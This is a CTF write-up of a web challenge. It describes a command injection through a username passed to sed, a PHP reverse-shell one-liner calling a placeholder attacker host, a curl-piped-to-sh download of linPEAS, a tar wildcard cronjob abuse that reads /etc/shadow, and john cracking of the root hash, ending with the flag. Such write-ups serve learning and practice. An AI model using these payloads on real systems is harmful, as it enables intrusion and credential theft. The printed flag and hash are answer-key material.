# Challenge
* Type: blackbox
* Authors: algorab, Sto
* Category: Web exploitation, Linux privilege escalation
* Description:
  - The kidnappers of Jojo have a new web platform! This will never end! You have to stop them now! Root their server, we need to save Jojo.
  - The flag is N0PS{root password}
  - Note: You will not receive any email from this challenge. If at any moment of the challenge you need to perform offline bruteforce attack, you can use rockyou.txt with best64.rule
  - Hints (unlock for 0 point):
    1. Have you accepted terms and conditions?
    2. Woops! I forgot my password
    3. This should help: https://owasp.org/www-community/attacks/Full_Path_Disclosure
    4. This should help: https://book.hacktricks.xyz/linux-hardening/privilege-escalation

# Recon
- When I connect to the site, I see a login form:
  ![image](https://github.com/NoSpaceAvailable/N0PSctf/assets/143888307/b3940f77-252b-47c8-a910-cc291b8650b9)

- It has login, create account functions, and also forgot password.
- I think it's a SQL injection challenge, so I tried some payloads, but nothing work. After a while, I decide to create an account and login. A popup is shown:
  ![image](https://github.com/NoSpaceAvailable/N0PSctf/assets/143888307/858b4523-9237-486c-820b-fecf38019557)

- Accept the Terms and conditions to reach other functions on the site. After that, a chat is shown. I see an account named `j0j0_admin123` on the chatbox. I can send them a message, so maybe it's a possible XSS here. I send them a simple payload:
  ![image](https://github.com/NoSpaceAvailable/N0PSctf/assets/143888307/bbfb89f0-38e6-4058-845a-5dfaf57053ae)

- It's obvious that they HTML encoded my message before sending to chatbox, so XSS is not possible.
- The Home page seem not interesting here. When I access Terms and conditions, the previous popup is shown to me:
  ![image](https://github.com/NoSpaceAvailable/N0PSctf/assets/143888307/5a1c23a1-10ff-4aa0-bbfa-f280aaaa19b9)

- At My profile, you can change your name here:
  
- Notice that my name appears at Terms and conditions popup, and I can change it, so it's a possible XSS:
  ![image](https://github.com/NoSpaceAvailable/N0PSctf/assets/143888307/e25a8189-ac1a-4b96-b66e-9d765d046d37)

- But, nothing happened:
  ![image](https://github.com/NoSpaceAvailable/N0PSctf/assets/143888307/fc85fa9b-2d22-468f-8cf4-7d4e9668d48e)

- The last function I didn't try is download the terms and conditions button. But when I download it:
  ![image](https://github.com/NoSpaceAvailable/N0PSctf/assets/143888307/dd7b3f2c-61be-4e59-84c1-881803d2515e)

- It show me an command line error of [sed](https://www.gnu.org/software/sed/manual/sed.html) command, instead of the Terms and conditions, so I think something bad happened here. Maybe it's because of my name? I turn my name to original, and download the pdf again:
  ![image](https://github.com/NoSpaceAvailable/N0PSctf/assets/143888307/f7778c5f-21cb-4d42-960a-0bdcbdf5c494)

- Everything is OK now, so I guess that the server use `sed` with my username for a command argument. So, it's a command injection here.

# Exploit
- First, I have to search on Google how to use `sed` command since I'm not familiar with it. According to the error I received at the first PDF, they use `sed -e`. Here are some example:
  ```shell
  sed -e 's/hello/world/' input.txt > output.txt
  echo "lmao this is funny" | sed -e 's/lmao/hehe/' # will output hehe this is funny 
  ```
- About this command, it's a powerful stream editor that allow you to search, delete, replace, extract text data line by line. This command is not vulnerable itself, but the server does not sanitize username before use is as an argument.
- Now I need to find a way to perform command injection.
## Command injection
- After a while of fuzzing, I found that the command line structure will look like:
  ```
  (some commands here) | sed -e 's/(username here)/(placeholder in PDF here)/' | (generate PDF here)
  ```

- To close the apostrophe character, my username will be:
  ```
  ' 2>/dev/null; echo "hacked";#
  ```
  - The `2>/dev/null` part is used to redirect syntax error to /dev/null
  - The hash character is to comment out the remain part of command line

- But, there still an error:
  ![image](https://github.com/NoSpaceAvailable/N0PSctf/assets/143888307/5b012d6c-90e5-4912-adc0-4c2a4f63074d)

- After a while playing with `sed` command on my own laptop, I see that I have to close the command with a `/` character:
  ![image](https://github.com/NoSpaceAvailable/N0PSctf/assets/143888307/ee8377a3-dd2f-42f6-8957-229681d1c4b5)
  ![image](https://github.com/NoSpaceAvailable/N0PSctf/assets/143888307/83316804-5949-4474-8ea2-e7243634bfdd)

- I added a `/` character before my username, but the error still here:
  ![image](https://github.com/NoSpaceAvailable/N0PSctf/assets/143888307/25d2a357-dfdb-4441-b756-c303b67d91cf)

- It's fuzzing time again, and I find that we can use the `sed` command like this:
  ```shell
  echo "lmao this is funny" | sed -e s/lmao/hehe/ (no apostrophe)
  ```
  ![image](https://github.com/NoSpaceAvailable/N0PSctf/assets/143888307/a25ba8a3-c0bf-465b-a798-7259db684e54)

- I tried to remove the apostrophe and the /dev/null part (my username become `/; echo "hacked";#`, and receive:
  ![image](https://github.com/NoSpaceAvailable/N0PSctf/assets/143888307/36314dc7-0f5e-4bb6-a675-fc7cd24b5a7f)

- Notice that the error with `sed` disappeared, but `echo` became `cho` for some reason. I tried to add an `e` to `echo`, and ...
  ![image](https://github.com/NoSpaceAvailable/N0PSctf/assets/143888307/2bf9f818-04ce-4cea-b301-619df23163cc)

  BOOM!!!

## Reverse shell
- As what a hacker do when they successfully perform command injection, I try to create a revshell for my convenience. I'm using ngrok here:
  ```shell
  ngrok tcp 1337
  (copy your HOST and PORT appeared on your terminal)
  ```
  Open another terminal:
  ```shell
  nc -nlvp 1337
  (setup a listener)
  ```
  Because it's a PHP server, and the server does not have Python or netcat installed, so I use a PHP reverse shell payload (from revshells.com):
  ```
  php -r '$sock=fsockopen("HOST", PORT);exec("sh <&3 >&3 2>&3");'
  ```
  Perform command injetion again:
  ```
  /; eecho "$(php -r '$sock=fsockopen("HOST", PORT);exec("sh <&3 >&3 2>&3");')";#
  ```
  ![image](https://github.com/NoSpaceAvailable/N0PSctf/assets/143888307/b029dafc-0885-4a0b-84c1-8b37a420df00)

## Local privilege escalation
- The goal is to read the root password, so we have to read /etc/shadow. But by default, we must have sudo or root privilege to read it.
- After a while checking the system, I found that I can download external resource using `curl`. I found a tool on [hacktrick](https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist)
- Using [this tool](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS), I can find attack vector easier. Just use the provided curl command:
  ```
  curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
  ```
  ![image](https://github.com/NoSpaceAvailable/N0PSctf/assets/143888307/23396030-5b0a-4c6f-994b-39e16b549bc1)

  Wait for it to run

- I see that there is a suspicious file in /opt, so I try to examine it:
  ![image](https://github.com/NoSpaceAvailable/N0PSctf/assets/143888307/b78dd28b-44d4-4eea-9ad5-736ebf899116)
  ![image](https://github.com/NoSpaceAvailable/N0PSctf/assets/143888307/422ac4a8-5e22-4a39-8307-acb428627b63)

- The script is a backup cronjob. It first cd to /var/www/jojo_website, write the date to log file, then use `tar` to compress all the file in that directory and save as */root/jojo_backup.tar*. Notice that the `tar` command use wildcard *, so it's vulnerable to [tar wildcard injection](https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/). It is ran by root, so we can abuse it
  ![image](https://github.com/NoSpaceAvailable/N0PSctf/assets/143888307/ebc6d1ec-f713-46bc-932f-fd60f95eaf61)

- I make some special file to abuse the wildcard:
  ![image](https://github.com/NoSpaceAvailable/N0PSctf/assets/143888307/9ab859ea-71de-4ef8-b8cf-fdce7297853e)

- Wait for a while, and check the /tmp, you will see a file named *shadow_file*. Cat it and we'll have the content of /etc/shadow, include the line:
  ```
  root:O6w162b1Hlo0I:19870:0:99999:7:::
  ```

- Do not forget the /etc/passwd:
  ```
  root:x:0:0:root:/root:/bin/bash
  ```

## Password cracking
- On my machine, I unshadow the password of root, and received:
  ![image](https://github.com/NoSpaceAvailable/N0PSctf/assets/143888307/661a2c91-9c67-4d7c-b938-5c7f8f5c96a7)

- Using `john` with rockyou.txt wordlist, and best64.rule set (the challenge tell me to do this), I found the root password:
  ```shell
  john --wordlist=rockyou.txt --rules best64.rule pass
  ```
- Received: `root:1badjojo:0:0:root:/root:/bin/bash`
- Password: `1badjojo`

# Flag
- The flag is: N0PS{1badjojo}
